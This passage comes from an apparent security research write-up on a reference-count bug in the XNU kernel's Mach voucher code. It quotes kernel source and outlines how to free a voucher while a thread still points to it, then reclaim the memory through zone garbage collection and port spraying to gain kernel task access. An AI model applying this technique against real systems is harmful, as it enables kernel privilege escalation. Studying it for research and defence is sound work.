<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">386</span><span class="o">:</span> <span class="cm">/*
    387:  *	Routine:	convert_port_to_voucher
    388:  *	Purpose:
    389:  *		Convert from a port to a voucher.
    390:  *		Doesn't consume the port [send-right] ref;
    391:  *		produces a voucher ref,	which may be null.
    392:  *	Conditions:
    393:  *		Caller has a send-right reference to port.
    394:  *		Port may or may not be locked.
    395:  */</span>
    <span class="mi">396</span><span class="o">:</span> <span class="n">ipc_voucher_t</span>
    <span class="mi">397</span><span class="o">:</span> <span class="n">convert_port_to_voucher</span><span class="p">(</span>
    <span class="mi">398</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>	<span class="n">port</span><span class="p">)</span>
    <span class="mi">399</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">400</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">401</span><span class="o">:</span> 		<span class="n">ipc_voucher_t</span> <span class="n">voucher</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_voucher_t</span><span class="p">)</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span><span class="p">;</span>
    <span class="mi">402</span><span class="o">:</span> 
    <span class="mi">403</span><span class="o">:</span> 		<span class="cm">/*
    404: 		 * No need to lock because we have a reference on the
    405: 		 * port, and if it is a true voucher port, that reference
    406: 		 * keeps the voucher bound to the port (and active).
    407: 		 */</span>
    <span class="mi">408</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">!=</span> <span class="n">IKOT_VOUCHER</span><span class="p">)</span>
    <span class="mi">409</span><span class="o">:</span> 			<span class="k">return</span> <span class="n">IV_NULL</span><span class="p">;</span>
    <span class="mi">410</span><span class="o">:</span> 
    <span class="mi">411</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">412</span><span class="o">:</span> 
    <span class="mi">413</span><span class="o">:</span> 		<span class="n">ipc_voucher_reference</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">414</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">415</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">416</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">IV_NULL</span><span class="p">;</span>
    <span class="mi">417</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">418</span><span class="o">:</span> </code></pre></figure>

<p>The function <strong>convert_voucher_to_port</strong> will decrease the reference count by calling <strong>ipc_voucher_release</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">492</span><span class="o">:</span> <span class="cm">/*
    493:  * Convert a voucher to a port.
    494:  */</span>
    <span class="mi">495</span><span class="o">:</span> <span class="n">ipc_port_t</span>
    <span class="mi">496</span><span class="o">:</span> <span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">497</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">498</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>	<span class="n">port</span><span class="p">,</span> <span class="n">send</span><span class="p">;</span>
    <span class="mi">499</span><span class="o">:</span> 
    <span class="mi">500</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IV_NULL</span> <span class="o">==</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">501</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">IP_NULL</span><span class="p">);</span>
    <span class="mi">502</span><span class="o">:</span> 
    <span class="mi">503</span><span class="o">:</span> 	<span class="n">assert</span><span class="p">(</span><span class="n">os_ref_get_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="mi">504</span><span class="o">:</span> 
    <span class="mi">505</span><span class="o">:</span> 	<span class="cm">/* create a port if needed */</span>
    <span class="mi">506</span><span class="o">:</span> 	<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">507</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">508</span><span class="o">:</span> 		<span class="n">port</span> <span class="o">=</span> <span class="n">ipc_port_alloc_kernel</span><span class="p">();</span>
    <span class="mi">509</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">510</span><span class="o">:</span> 		<span class="n">ipc_kobject_set_atomically</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">511</span><span class="o">:</span> 
    <span class="mi">512</span><span class="o">:</span> 		<span class="cm">/* If we lose the race, deallocate and pick up the other guy's port */</span>
    <span class="mi">513</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">OSCompareAndSwapPtr</span><span class="p">(</span><span class="n">IP_NULL</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">514</span><span class="o">:</span> 			<span class="n">ipc_port_dealloc_kernel</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">515</span><span class="o">:</span> 			<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">516</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">517</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span> <span class="o">==</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">518</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">519</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">520</span><span class="o">:</span> 	
    <span class="mi">521</span><span class="o">:</span> 	<span class="n">ip_lock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">522</span><span class="o">:</span> 	<span class="n">assert</span><span class="p">(</span><span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">523</span><span class="o">:</span> 	<span class="n">send</span> <span class="o">=</span> <span class="n">ipc_port_make_send_locked</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">524</span><span class="o">:</span> 
    <span class="mi">525</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_srights</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">526</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">old_notify</span><span class="p">;</span>
    <span class="mi">527</span><span class="o">:</span> 
    <span class="mi">528</span><span class="o">:</span> 		<span class="cm">/* transfer our ref to the port, and arm the no-senders notification */</span>
    <span class="mi">529</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_NULL</span> <span class="o">==</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_nsrequest</span><span class="p">);</span>
    <span class="mi">530</span><span class="o">:</span> 		<span class="n">ipc_port_nsrequest</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_mscount</span><span class="p">,</span> <span class="n">ipc_port_make_sonce_locked</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">old_notify</span><span class="p">);</span>
    <span class="mi">531</span><span class="o">:</span> 		<span class="cm">/* port unlocked */</span>
    <span class="mi">532</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_NULL</span> <span class="o">==</span> <span class="n">old_notify</span><span class="p">);</span>
    <span class="mi">533</span><span class="o">:</span> 	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="mi">534</span><span class="o">:</span> 		<span class="cm">/* piggyback on the existing port reference, so consume ours */</span>
    <span class="mi">535</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">536</span><span class="o">:</span> 		<span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">537</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">538</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">send</span><span class="p">);</span>
    <span class="mi">539</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">540</span><span class="o">:</span> </code></pre></figure>

<p>And within the routine <strong>task_swap_mach_voucher</strong>, the reference count of new voucher is descreased by one by calling <strong>ipc_voucher_release</strong> (Line 4844).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">4836</span><span class="o">:</span> 
    <span class="mi">4837</span><span class="o">:</span> 	<span class="n">task</span> <span class="o">=</span> <span class="n">convert_port_to_task</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>
    <span class="mi">4838</span><span class="o">:</span> 
    <span class="mi">4839</span><span class="o">:</span> 	<span class="n">new_voucher</span> <span class="o">=</span> <span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4840</span><span class="o">:</span> 
    <span class="mi">4841</span><span class="o">:</span> 	<span class="n">old_voucher</span> <span class="o">=</span> <span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4842</span><span class="o">:</span> 
    <span class="mi">4843</span><span class="o">:</span> 	<span class="n">RetCode</span> <span class="o">=</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">new_voucher</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">old_voucher</span><span class="p">);</span>
    <span class="mi">4844</span><span class="o">:</span> 	<span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">new_voucher</span><span class="p">);</span>
    <span class="mi">4845</span><span class="o">:</span> 	<span class="n">task_deallocate</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
    <span class="mi">4846</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">4847</span><span class="o">:</span> 		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
    <span class="mi">4848</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">4849</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigKernelSpecificCode</span>
    <span class="mi">4850</span><span class="o">:</span> 
    <span class="mi">4851</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
    <span class="mi">4852</span><span class="o">:</span> 		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4853</span><span class="o">:</span> 
    <span class="mi">4854</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
    <span class="mi">4855</span><span class="o">:</span> 		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
    <span class="mi">4856</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* __MigKernelSpecificCode */</span>
    <span class="mi">4857</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">old_voucher</span><span class="p">);</span>
    <span class="mi">4858</span><span class="o">:</span> 
    <span class="mi">4859</span><span class="o">:</span> </code></pre></figure>

<p>Here are the reference count changes.</p>

<pre>	**Line 4839: Reference count of new_voucher + 1**

	**Line 4841: Reference count of old_voucher + 1**

	**Line 4843: task_swap_mach_voucher called -&gt; old_voucher = new_voucher**

	**Line 4844: Reference count of new_voucher - 1**

	**Line 4857: Reference count of new_voucher - 1 (Because old_voucher is now new_voucher)**

</pre>

<p>I think you are starting to see the problem here. The reference count of <strong>new_voucher</strong> can be reduced to 0 thereby freeing the object. And the reference count of <strong>old_voucher</strong> can be increased by too many. As discussed before, the reference count overflow has been protected by the max cap value of <strong>0x0fffffff</strong>.</p>

<p>So it is possible to get a dangling pointer pointing to a voucher. This can be done by storing a pointer to the voucher, and then using the vulnerability to reduce the reference count of the voucher to 0, which will free the voucher.</p>

<p><img src="/images/11b.png" alt="11" /></p>

<h3 id="about-vouchers">About Vouchers</h3>

<p>Before proceeding, it is always good idea to look at the object struct and understand the different fields in it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">63</span><span class="o">:</span> <span class="cm">/*
    64:  * IPC Voucher
    65:  *
    66:  * Vouchers are a reference counted immutable (once-created) set of
    67:  * indexes to particular resource manager attribute values
    68:  * (which themselves are reference counted).
    69:  */</span>
    <span class="mi">70</span><span class="o">:</span> <span class="k">struct</span> <span class="n">ipc_voucher</span> <span class="p">{</span>
    <span class="mi">71</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_hash</span><span class="p">;</span>	<span class="cm">/* checksum hash */</span>
    <span class="mi">72</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_sum</span><span class="p">;</span>		<span class="cm">/* checksum of values */</span>
    <span class="mi">73</span><span class="o">:</span> 	<span class="n">os_refcnt_t</span>		<span class="n">iv_refs</span><span class="p">;</span>	<span class="cm">/* reference count */</span>
    <span class="mi">74</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_table_size</span><span class="p">;</span>	<span class="cm">/* size of the voucher table */</span>
    <span class="mi">75</span><span class="o">:</span> 	<span class="n">iv_index_t</span>		<span class="n">iv_inline_table</span><span class="p">[</span><span class="n">IV_ENTRIES_INLINE</span><span class="p">];</span>
    <span class="mi">76</span><span class="o">:</span> 	<span class="n">iv_entry_t</span>		<span class="n">iv_table</span><span class="p">;</span>	<span class="cm">/* table of voucher attr entries */</span>
    <span class="mi">77</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>		<span class="n">iv_port</span><span class="p">;</span>	<span class="cm">/* port representing the voucher */</span>
    <span class="mi">78</span><span class="o">:</span> 	<span class="n">queue_chain_t</span>		<span class="n">iv_hash_link</span><span class="p">;</span>	<span class="cm">/* link on hash chain */</span>
    <span class="mi">79</span><span class="o">:</span> <span class="p">};</span></code></pre></figure>

<p>So the first thing is to identify which object to store the pointer for the freed voucher in. The best way for this is to search for <strong>ipc_voucher_t</strong> in the kernel source, and look for APIs that easily allow getting and setting of that pointer. One of the places which stands out is in the thread object inside <strong>osfmk/kern/thread.h</strong> which stores the voucher reference with the name <strong>ith_voucher</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="kr">thread</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">570</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_EMBEDDED</span>
    <span class="mi">571</span><span class="o">:</span> 	<span class="n">task_watch_t</span> <span class="o">*</span>	<span class="n">taskwatch</span><span class="p">;</span>		<span class="cm">/* task watch */</span>
    <span class="mi">572</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* CONFIG_EMBEDDED */</span>
    <span class="mi">573</span><span class="o">:</span> 
    <span class="mi">574</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_callout_interrupt_wakeups</span><span class="p">;</span>
    <span class="mi">575</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_callout_platform_idle_wakeups</span><span class="p">;</span>
    <span class="mi">576</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_timer_wakeups_bin_1</span><span class="p">;</span>
    <span class="mi">577</span><span class="o">:</span> 	<span class="kt">uint32_t</span>			<span class="n">thread_timer_wakeups_bin_2</span><span class="p">;</span>
    <span class="mi">578</span><span class="o">:</span> 	<span class="kt">uint16_t</span>			<span class="n">thread_tag</span><span class="p">;</span>
    <span class="mi">579</span><span class="o">:</span> 	<span class="kt">uint16_t</span>			<span class="n">callout_woken_from_icontext</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="mi">580</span><span class="o">:</span> 					<span class="n">callout_woken_from_platform_idle</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="mi">581</span><span class="o">:</span> 					<span class="n">callout_woke_thread</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="mi">582</span><span class="o">:</span> 					<span class="n">thread_bitfield_unused</span><span class="o">:</span><span class="mi">13</span><span class="p">;</span>
    <span class="mi">583</span><span class="o">:</span> 
    <span class="mi">584</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>		<span class="n">ith_voucher_name</span><span class="p">;</span>
    <span class="mi">585</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>			<span class="n">ith_voucher</span><span class="p">;</span>
    <span class="mi">586</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_IOSCHED</span>
    <span class="mi">587</span><span class="o">:</span> 	<span class="kt">void</span> 				<span class="o">*</span><span class="n">decmp_upl</span><span class="p">;</span>
    <span class="mi">588</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span> <span class="cm">/* CONFIG_IOSCHED */</span>
    <span class="mi">589</span><span class="o">:</span> </code></pre></figure>

<p>The functions <strong>thread_get_mach_voucher</strong> and <strong>thread_set_mach_voucher</strong> can be used to read and write the voucher reference from userland. Again, as we recall from part 1, we need to look at the <strong>MIG</strong> generated code for this function.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">thread_act_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">2597</span><span class="o">:</span> <span class="cm">/* Routine thread_get_mach_voucher */</span>
    <span class="mi">2598</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xthread_get_mach_voucher</span>
    <span class="mi">2599</span><span class="o">:</span> 	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">2600</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">2601</span><span class="o">:</span> 
    <span class="mi">2602</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2603</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">2604</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2605</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">2606</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">2607</span><span class="o">:</span> 		<span class="n">NDR_record_t</span> <span class="n">NDR</span><span class="p">;</span>
    <span class="mi">2608</span><span class="o">:</span> 		<span class="n">mach_voucher_selector_t</span> <span class="n">which</span><span class="p">;</span>
    <span class="mi">2609</span><span class="o">:</span> 		<span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">2610</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2614</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__thread_get_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">2615</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Reply__thread_get_mach_voucher_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2616</span><span class="o">:</span> 
    <span class="mi">2617</span><span class="o">:</span> 	<span class="cm">/*
    2618: 	 * typedef struct {
    2619: 	 * 	mach_msg_header_t Head;
    2620: 	 * 	NDR_record_t NDR;
    2621: 	 * 	kern_return_t RetCode;
    2622: 	 * } mig_reply_error_t;
    2623: 	 */</span>
    <span class="mi">2624</span><span class="o">:</span> 

    <span class="mi">2686</span><span class="o">:</span> 	<span class="n">thr_act</span> <span class="o">=</span> <span class="n">convert_port_to_thread</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>
    <span class="mi">2687</span><span class="o">:</span> 
    <span class="mi">2688</span><span class="o">:</span> 	<span class="n">RetCode</span> <span class="o">=</span> <span class="n">thread_get_mach_voucher</span><span class="p">(</span><span class="n">thr_act</span><span class="p">,</span> <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">which</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2689</span><span class="o">:</span> 	<span class="n">thread_deallocate</span><span class="p">(</span><span class="n">thr_act</span><span class="p">);</span>
    <span class="mi">2690</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">2691</span><span class="o">:</span> 		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
    <span class="mi">2692</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">2695</span><span class="o">:</span> 	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">2702</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>Once we get a dangling pointer to a freed voucher object, we can then reallocate the freed voucher object with something else. However, this is not straightforward. Vouchers typically reside in their own zone <strong>ipc vouchers</strong> as can be seen in <strong>osfmk/ipc/ipc_voucher.c</strong> where the <strong>zinit</strong> call allocates a new zone for the vouchers.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">198</span><span class="o">:</span> <span class="kt">void</span>
    <span class="mi">199</span><span class="o">:</span> <span class="n">ipc_voucher_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
    <span class="mi">200</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">201</span><span class="o">:</span> 	<span class="n">natural_t</span> <span class="n">ipc_voucher_max</span> <span class="o">=</span> <span class="p">(</span><span class="n">task_max</span> <span class="o">+</span> <span class="n">thread_max</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
    <span class="mi">202</span><span class="o">:</span> 	<span class="n">natural_t</span> <span class="n">attr_manager_max</span> <span class="o">=</span> <span class="n">MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN</span><span class="p">;</span>
    <span class="mi">203</span><span class="o">:</span> 	<span class="n">iv_index_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="mi">204</span><span class="o">:</span> 
    <span class="mi">205</span><span class="o">:</span> 	<span class="n">ipc_voucher_zone</span> <span class="o">=</span> <span class="n">zinit</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ipc_voucher</span><span class="p">),</span>
    <span class="mi">206</span><span class="o">:</span> 				 <span class="n">ipc_voucher_max</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ipc_voucher</span><span class="p">),</span>
    <span class="mi">207</span><span class="o">:</span> 				 <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">ipc_voucher</span><span class="p">),</span>
    <span class="mi">208</span><span class="o">:</span> 				 <span class="s">"ipc vouchers"</span><span class="p">);</span>
    <span class="mi">209</span><span class="o">:</span> 	<span class="n">zone_change</span><span class="p">(</span><span class="n">ipc_voucher_zone</span><span class="p">,</span> <span class="n">Z_NOENCRYPT</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
    <span class="mi">210</span><span class="o">:</span> 
    <span class="mi">211</span><span class="o">:</span> 	
    <span class="mi">216</span><span class="o">:</span> </code></pre></figure>

<p>So the freed memory for the voucher will be placed in the freelist of the zone and allocated to a new voucher when it is created. Therefore in order to reallocate with some other object, the only feasible way is to initiate zone garbage collection which will move the freed memory for the vouchers (min size is 1 page which includes the freed voucher) into the zone map and then reallocate that memory with something else. Zone garbage collection can be triggered by allocating a large number of vouchers and freeing them, making that memory available for next allocation and then spraying via port pointers as we will see later in this article.</p>

<p>Let’s look closely at <strong>thread_get_mach_voucher</strong> in <strong>MIG</strong> generated code again. Assuming we did reallocate the freed voucher with some object, the call <strong>thread_get_mach_voucher</strong> should succeed without panicking the kernel, since we are interested in <strong>tfp0</strong> eventually and not really kernel panics. The function <strong>thread_get_mach_voucher</strong> inside the kernel which is called on Line 2688 calls <strong>ipc_voucher_reference(voucher)</strong> , which should mean that the <strong>iv_refs</strong> field should be valid for the voucher.</p>

